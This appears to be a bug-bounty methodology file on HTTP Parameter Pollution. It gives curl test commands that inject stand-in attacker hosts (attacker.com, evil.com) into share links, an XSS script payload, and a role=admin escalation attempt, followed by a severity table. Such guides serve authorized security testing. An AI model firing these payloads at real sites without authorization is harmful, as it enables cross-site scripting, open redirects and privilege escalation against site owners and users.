---
name: attack-parameter-pollution
description: "HTTP Parameter Pollution — client/server-side HPP via duplicate parameters and social sharing button pollution"
category: "input-validation"
version: "1.0"
author: "bountyreper-official"
tags:
  - hpp
  - parameter-pollution
  - injection
tech_stack:
  - web
cwe_ids:
  - CWE-235
chains_with:
  - wstg-injection
  - attack-open-redirect
prerequisites: []
---

# HTTP Parameter Pollution

## Objective

Exploit inconsistent parsing of duplicate HTTP parameters between client and server, and via social sharing buttons.

> **Attribution:** Methodology from [KathanP19/HowToHunt — Parameter_Pollution](https://github.com/KathanP19/HowToHunt/tree/master/Parameter_Pollution). Licensed GPL-3.0.

## Testing Methodology

### Client-Side HPP (Social Sharing)

Many sites build sharing URLs client-side without encoding:

```html
<!-- Vulnerable: pollutes sharing URL -->
https://target.com/share?url=https://target.com/page&url=//attacker.com
```

Test:
```bash
curl "https://target.com/share?url=https://attacker.com&url=https://target.com/page" -D-
# Check if attacker URL reflected in sharing link
```

### Server-Side HPP

```bash
# Duplicate param — server may take first, WAF second, or concatenate
curl "https://target.com/search?q=test&q=<script>alert(1)</script>"
curl "https://target.com/api?role=user&role=admin"

# Pollute via social buttons (Twitter/Facebook share links carry params)
# Intercept share button link, add &url=//evil.com
```

## What Constitutes a Finding

| Condition | Severity |
|-----------|----------|
| HPP leads to XSS via reflected parameter | High (P2) |
| HPP leads to privilege escalation (role=admin) | High (P2) |
| HPP via sharing button open redirect | Medium (P3) |

## References

- [HowToHunt — Parameter Pollution](https://github.com/KathanP19/HowToHunt/tree/master/Parameter_Pollution)
